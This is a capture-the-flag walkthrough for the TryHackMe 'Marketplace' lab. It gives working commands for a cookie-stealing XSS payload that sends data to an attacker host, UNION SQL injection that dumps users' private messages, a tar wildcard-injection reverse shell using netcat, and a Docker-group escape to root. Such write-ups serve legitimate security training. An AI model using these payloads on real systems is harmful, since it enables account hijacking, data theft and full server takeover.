# [The Marketplace](https://tryhackme.com/room/marketplace)

## Can you take over The Marketplace's infrastructure?

The sysadmin of The Marketplace, Michael, has given you access to an internal server of his, so you can pentest the marketplace platform he and his team has been working on. He said it still has a few bugs he and his team need to iron out.

Can you take advantage of this and will you be able to gain root access on his server?

### What is flag 1?

_If you think a listing is breaking the rules, you can report it!_

1. First, we perform a comprehensive port scan to identify running services:

```bash
nmap -sV -p- <TARGET_IP>
```

**Results:**

```
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp    open  http    nginx 1.19.2
32768/tcp open  http    Node.js (Express middleware)
```

2. Start a simple HTTP server on your attacking machine to capture cookies:

```bash
python3 -m http.server
```

3. Create a new account on the marketplace. Create a new listing with the following XSS payload in both the **title** and **description** fields:

```javascript
<script>fetch('http://<ATTACKER_IP>:8000/?cookie='+document.cookie)</script>
```

Report the listing to trigger the admin to view it.

[SCREEN01]

4. Replace your `token` cookie value with the stolen admin token. Navigate to `http://<TARGET_IP>/admin` to access the admin panel and retrieve the first flag.

[SCREEN02]

---

### What is flag 2? (User.txt)

1. The admin panel has a vulnerable user lookup feature. Test for SQL injection by visiting:

```
http://<TARGET_IP>/admin?user=0%20union%20select%201,2,3,4%20--%20-
```

**Results:**

```
User 1
User 2
ID: 1
Is administrator: true
```

This confirms the application is vulnerable to **UNION-based SQL injection** with 4 columns.

2. Extract available database schemas:

```
http://<TARGET_IP>/admin?user=0%20union%20select%201,group_concat(schema_name),3,4%20from%20information_schema.schemata%20--%20-
```

**Results:**

```
User 1
User information_schema,marketplace
ID: 1
Is administrator: true
```

The `marketplace` database is our target.

3. Extract table names from the marketplace database:

```
http://<TARGET_IP>/admin?user=0%20union%20select%201,group_concat(table_name),3,4%20from%20information_schema.tables%20where%20table_schema=%27marketplace%27%20--%20-
```

**Results:**

```
User 1
User items,messages,users
ID: 1
Is administrator: true
```

4. Extract column names from the messages table:

```
http://<TARGET_IP>/admin?user=0%20union%20select%201,group_concat(column_name),3,4%20from%20information_schema.columns%20where%20table_name=%27messages%27%20--%20-
```

```
User 1
User id,is_read,message_content,user_from,user_to
ID: 1
Is administrator: true
```

5. Dump all messages with recipient information:

```
http://<TARGET_IP>/admin?user=0%20union%20select%201,group_concat(user_to,%27:%27,message_content),3,4%20from%20marketplace.messages%20--%20-
```

```
User 1
User
3:Hello! An automated system has detected your SSH password is too weak and needs to be changed. You have been generated a new temporary password. Your new password is: @b_ENXkGYUCAv3zJ,
4:Thank you for your report. One of our admins will evaluate whether the listing you reported breaks our guidelines and will get back to you via private message. Thanks for using The Marketplace!,
4:Thank you for your report. We have reviewed the listing and found nothing that violates our rules.,
4:Thank you for your report. One of our admins will evaluate whether the listing you reported breaks our guidelines and will get back to you via private message. Thanks for using The Marketplace!,
4:Thank you for your report. We have reviewed the listing and found nothing that violates our rules.,
2:hello,
4:Thank you for your report. One of our admins will evaluate whether the listing you reported breaks our guidelines and will get back to you via private message. Thanks for using The Marketplace!,
4:Thank you for your report. We have r
ID: 1
Is administrator: true
```

**Key finding:** User ID 3 received a password reset message with credentials: `@b_ENXkGYUCAv3zJ`

6. In the admin panel at `http://<TARGET_IP>/admin`, verify that user ID 3 corresponds to the username `jake`.

7. Connect via SSH using the discovered credentials:

```bash
ssh jake@<TARGET_IP>
# Password: @b_ENXkGYUCAv3zJ
```

8. Once logged in as jake, retrieve the user flag:

```bash
ls
cat user.txt
```

[SCREEN03]

---

### What is flag 3? (Root.txt)

1. Check what commands jake can run with sudo:

```bash
sudo -l
```

**Results:**

```
User jake may run the following commands on the-marketplace:
    (michael) NOPASSWD: /opt/backups/backup.sh
```

Jake can run `/opt/backups/backup.sh` as the user `michael` without a password.

**Content of /opt/backups/backup.tar:**

```bash
#!/bin/bash
echo "Backing up files...";
tar cf /opt/backups/backup.tar *
```

The script uses a wildcard (`*`) in the tar command, which is vulnerable to **wildcard injection**. We can exploit this using tar's checkpoint feature.

2. On your attacking machine, start a netcat listener:

```bash
nc -lvnp 4444
```

3. Create malicious files that will be interpreted as tar command-line arguments:

```bash
cd /opt/backups

# Create reverse shell script
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKER_IP> 4444 >/tmp/f" > shell.sh

# Create checkpoint arguments as filenames
echo "" > "--checkpoint=1"
echo "" > "--checkpoint-action=exec=sh shell.sh"

# Ensure backup.tar is writable
chmod 777 backup.tar

# Execute the backup script as michael
sudo -u michael /opt/backups/backup.sh
```

When tar expands the `*`, it interprets the filenames as command-line arguments, executing our shell script at checkpoint 1.

4. In your netcat listener, you should receive a reverse shell. Verify your identity:

```bash
id
```

**Results:**

```
uid=1002(michael) gid=1002(michael) groups=1002(michael),999(docker)
```

Michael is a member of the `docker` group, which we can exploit for privilege escalation.

5. List available Docker images:

```bash
docker image ls
```

6. Upgrade to a more stable shell:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

7. Exploit Docker group membership to mount the host filesystem and gain root access:

```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

8. You now have root access to the host system:

```bash
whoami
ls /root
cat /root/root.txt
```

[SCREEN04]
